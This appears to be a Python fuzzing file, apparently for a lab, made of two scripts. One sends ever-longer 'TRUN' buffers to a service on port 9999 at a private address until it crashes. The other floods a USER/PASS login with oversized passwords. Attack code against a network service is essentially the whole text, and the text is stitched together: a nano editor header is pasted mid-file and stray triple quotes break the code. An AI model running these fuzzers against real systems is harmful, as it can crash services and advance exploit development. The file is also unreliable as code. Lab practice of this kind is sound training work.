#!/usr/bin/python

"""
import sys
import socket
from time import sleep

buffer = "A" * 100

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect(('192.168.0.234', 9999))
        s.send(('TRUN /.:/' + buffer).encode())
        s.settimeout(None)
        s.close()
        sleep(1)
        buffer = buffer + ("A" * 100)
    except Exception as ex:
        print(ex)
        lengthBuffer = len(buffer)
        print("Fuzzing crashed at {} bytes".format(lengthBuffer))
        sys.exit()

  GNU nano 2.9.8                                                 fuzzer.py

#!/usr/bin/python
"""
import socket

# Create buffer array, from 1 to 5900, with increments of 200
buffer = ["A"]
counter = 100
while len(buffer) < 50:
        buffer.append("A" * counter)
        counter = counter + 200

for string in buffer:
        print("Sending evil buffer with %s bytes" % len(string))
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('192.168.0.234', 9999))
        data = s.recv(1024)
        # print data

        s.send(('USER test' + '\r\n').encode())
        data = s.recv(1024)
        # print data

        s.send(('PASS test' + string + '\r\n').encode())
        data = s.recv(1024)
        # print data
        s.close()

print("\nDone!")
